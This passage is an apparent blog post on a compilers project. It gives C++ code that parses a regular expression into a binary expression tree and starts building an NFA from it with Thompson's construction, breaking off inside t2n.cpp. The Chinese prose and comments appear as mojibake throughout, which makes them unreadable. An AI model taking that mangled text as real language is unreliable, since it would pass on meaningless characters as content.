<p>æ¯”å¦‚<code>a|(b.c)*|d.e</code>å¯¹åº”çš„è¡¨è¾¾å¼æ ‘å°±æ˜¯:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\XDcompAT&gt;run-compat.bat RE-TREE <span class="string">&quot;a|(bc)*|de&quot;</span> -g</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221018113058098.png"
alt="image-20221018113058098" />
<figcaption aria-hidden="true">image-20221018113058098</figcaption>
</figure>
<p>å³è¾¹è¿™ä¸ªå›¾,æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šå¾€ä¸‹åˆ†ä¸¤ä¸ªå‰,å› æ­¤å¯ä»¥ç”¨äºŒå‰æ ‘å®ç°,åªæœ‰é—­åŒ…è¿ç®—è¿™é‡Œæ˜¯åªæœ‰ä¸€ä¸ªå„¿å­çš„,å¯ä»¥ä½œä¸ºäºŒå‰æ ‘èŠ‚ç‚¹çš„å·¦å„¿å­,å³å„¿å­ä¸ºç©º</p>
<h3 id="e2t.h">e2t.h</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Tree.h&quot;</span></span></span><br><span class="line"><span class="comment">//ä»¥ä¸‹å‡½æ•°éƒ½æ˜¯æµ‹è¯•å­—ç¬¦æ€§è´¨</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isOr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isJoin</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isClosure</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isRightBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEnd</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span> <span class="title function_">getCurrentOperator</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isAlpha</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCharacter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isNull</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSpace</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line">TreeNode *<span class="title function_">evalOr</span><span class="params">()</span>;</span><br><span class="line">TreeNode *<span class="title function_">evalJoin</span><span class="params">()</span>;</span><br><span class="line">TreeNode *<span class="title function_">evalClosure</span><span class="params">()</span>;</span><br><span class="line">Tree <span class="title function_">getTree</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;)</span>;</span><br></pre></td></tr></table></figure>
<h3 id="e2t.cpp">e2t.cpp</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Tree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;e2t.h&quot;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//æ¨¡å—å…¨å±€å˜é‡,ç”¨äºå¤šä¸ªå‡½æ•°ä¹‹é—´é€šä¿¡</span></span><br><span class="line"><span class="type">static</span> <span class="built_in">string</span> expression;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pos;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Invalid;</span><br><span class="line"><span class="comment">// TreeNodeå’ŒTreeä¸ºäºŒå‰æ ‘æ•°æ®ç»“æ„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»¥ä¸‹å‡½æ•°éƒ½æ˜¯æµ‹è¯•å­—ç¬¦æ€§è´¨</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isOr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isJoin</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isClosure</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isRightBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEnd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> expression[pos] == <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> <span class="title function_">getCurrentOperator</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> expression[pos];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isAlpha</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCharacter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isAlpha(c))<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> c!=<span class="string">&#x27;.&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;|&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;(&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;)&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isNull</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSpace</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Tree <span class="title function_">getTree</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span> <span class="comment">//ä¼ é€’ä¸€ä¸ªstrè¡¨è¾¾å¼,æ„å»ºä¸€ä¸ªè¯­æ³•æ ‘å¹¶è¿”å›ç›¸åº”äºŒå‰æ ‘å®ä¾‹</span></span><br><span class="line">&#123;                               <span class="comment">//æ¶ˆé™¤ç©ºæ ¼,æ·»åŠ ç‚¹å·</span></span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">exp</span>;</span><br><span class="line">    <span class="built_in">string</span> removeSpace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> c : str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isSpace(c))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        removeSpace += c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> length = removeSpace.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isAlpha(removeSpace[i]) &amp;&amp; i &gt; <span class="number">0</span> &amp;&amp; isAlpha(removeSpace[i - <span class="number">1</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">exp</span> += <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exp</span> += removeSpace[i];</span><br><span class="line">    &#125;</span><br><span class="line">    expression = <span class="built_in">exp</span>;</span><br><span class="line">    Invalid = <span class="number">0</span>;</span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Tree(evalOr());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode *<span class="title function_">evalOr</span><span class="params">()</span> <span class="comment">//é¡¶å±‚å‡½æ•°,å°†è¡¨è¾¾å¼è§†ä¸ºè‹¥å¹²é¡¹ç›®çš„æˆ–</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *joinTerm = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *root = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *assist = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> op = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    joinTerm = evalJoin();</span><br><span class="line">    <span class="keyword">if</span> (Invalid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    root = joinTerm;</span><br><span class="line">    <span class="keyword">while</span> (!isEnd())</span><br><span class="line">    &#123;</span><br><span class="line">        op = getCurrentOperator();</span><br><span class="line">        <span class="keyword">if</span> (!isOr(op))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;</span><br><span class="line">        joinTerm = evalJoin();</span><br><span class="line">        <span class="keyword">if</span> (Invalid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assist = root;</span><br><span class="line">        root = new TreeNode(op, assist, joinTerm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode *<span class="title function_">evalJoin</span><span class="params">()</span> <span class="comment">//äºŒå±‚å‡½æ•°,å°†å±€éƒ¨è¡¨è¾¾å¼è§†ä¸ºè‹¥å¹²é¡¹ç›®çš„è¿æ¥</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *clousureTerm = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *root = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *assist = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> op = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    clousureTerm = evalClosure();</span><br><span class="line">    <span class="keyword">if</span> (Invalid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    root = clousureTerm;</span><br><span class="line">    <span class="keyword">while</span> (!isEnd())</span><br><span class="line">    &#123;</span><br><span class="line">        op = getCurrentOperator();</span><br><span class="line">        <span class="keyword">if</span> (!isJoin(op))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;</span><br><span class="line">        clousureTerm = evalClosure();</span><br><span class="line">        <span class="keyword">if</span> (Invalid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assist = root;</span><br><span class="line">        root = new TreeNode(op, assist, clousureTerm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode *<span class="title function_">evalClosure</span><span class="params">()</span> <span class="comment">//åº•å±‚å‡½æ•°,å°†å±€éƒ¨è¡¨è¾¾å¼è§†ä¸ºæ‹¬å·æˆ–è€…æ ‘,å¹¶ä¸”åˆ¤æ–­æ˜¯å¦æœ‰æ˜Ÿé—­åŒ…</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *joinTerm;</span><br><span class="line">    TreeNode *singleTerm;</span><br><span class="line">    TreeNode *root;</span><br><span class="line">    TreeNode *assist;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line"></span><br><span class="line">    op = getCurrentOperator();</span><br><span class="line">    <span class="keyword">if</span> (isLeftBracket(op))</span><br><span class="line">    &#123;</span><br><span class="line">        ++pos;</span><br><span class="line">        joinTerm = evalOr();</span><br><span class="line">        op = getCurrentOperator();</span><br><span class="line">        <span class="keyword">if</span> (!isRightBracket(op))</span><br><span class="line">        &#123;</span><br><span class="line">            Invalid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        root = joinTerm;</span><br><span class="line">        ++pos;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        singleTerm = new TreeNode(op);</span><br><span class="line">        ++pos;</span><br><span class="line">        root = singleTerm;</span><br><span class="line">    &#125;</span><br><span class="line">    op = getCurrentOperator();</span><br><span class="line">    <span class="keyword">if</span> (!isClosure(op))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    ++pos; <span class="comment">//è¶Šè¿‡é—­åŒ…æ˜Ÿå·</span></span><br><span class="line">    assist = root;</span><br><span class="line">    root = new TreeNode(op, assist);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æµ‹è¯•å­˜æ ¹</span></span><br><span class="line"><span class="comment">// int main()</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     string exp = &quot;a  |(b.  c)*|d e&quot;;//æµ‹è¯•æ­£è§„å¼å­</span></span><br><span class="line"><span class="comment">//     Tree tree = getTree(exp);//</span></span><br><span class="line"><span class="comment">//     tree.postOrder();</span></span><br><span class="line"><span class="comment">//     tree.inOrder();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     return 0;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘è¿è¡Œ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a b c . * | d e . | <span class="comment">#åæ ¹éå†</span></span><br><span class="line">a | b . c * | d . e	<span class="comment">#ä¸­æ ¹éå†</span></span><br></pre></td></tr></table></figure>
<p>ä¸æ•™å…·ç»™å‡ºçš„äºŒå‰æ ‘å›¾æ˜¯ä¸€æ ·çš„</p>
<h2 id="t2n">t2n</h2>
<p>tree to nfa</p>
<p>NFAæ˜¯ä¸€ä¸ªæœ‰å‘å›¾,å¯ä»¥ä»¥Graphä¸ºåŸºç±»</p>
<h3 id="t2n.h">t2n.h</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Tree.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt; handle;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NFA</span>:</span>public Graph&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> toJudge;</span><br><span class="line">    <span class="type">int</span> tot_length;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> finish;</span><br><span class="line"></span><br><span class="line">    NFA(Tree &amp;);</span><br><span class="line">    handle <span class="title function_">subNFA</span><span class="params">(TreeNode *)</span>;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">backtracing_judge</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;expression)</span>;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">backtracing_judge</span><span class="params">(<span class="type">int</span> current_node,<span class="type">int</span> current_index)</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">getEpsilon</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; T)</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">smove</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; S,<span class="type">char</span> character)</span>;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">no_backtracing_judge</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;str)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="t2n.cpp">t2n.cpp</h3>
<p>ä¸»è¦é€»è¾‘,å°±æ˜¯ä¸€å…±getNFAé€’å½’å‡½æ•°,ä½¿ç”¨äº†æ±¤æ™®æ£®ç®—æ³•</p>
<p>è¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªè¯­æ³•æ ‘æ ¹,æ ¹æ®è¯¥æ ¹èŠ‚ç‚¹ä¸­çš„ç¬¦å·æŒ‡ç¤º,å†³å®šå¦‚ä½•å»ºç«‹å­å›¾,è¿”å›å½“å‰å­å›¾</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 